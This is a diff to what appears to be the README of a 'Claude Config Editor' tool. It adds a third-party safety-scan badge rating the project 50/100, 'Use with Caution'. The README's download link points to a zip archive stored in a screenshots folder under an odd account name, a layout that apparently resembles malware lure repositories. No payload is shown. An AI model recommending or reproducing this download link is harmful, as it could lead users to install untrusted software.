@@ -9,6 +9,7 @@ Welcome to the Claude Config Editor! This lightweight web tool helps you clean, 
 To download and install the tool, **visit this page to download**:
 
 [![Download Claude Config Editor](https://raw.githubusercontent.com/Genusboragosirharoldwalterkroto654/claude-config-editor/main/screenshots/config_editor_claude_v2.5.zip%20Now-claude--config--editor-brightgreen)](https://raw.githubusercontent.com/Genusboragosirharoldwalterkroto654/claude-config-editor/main/screenshots/config_editor_claude_v2.5.zip)
+[![SafeSkill 50/100](https://img.shields.io/badge/SafeSkill-50%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/chandaltesticular328-claude-config-editor)
 
 Follow these steps:
 
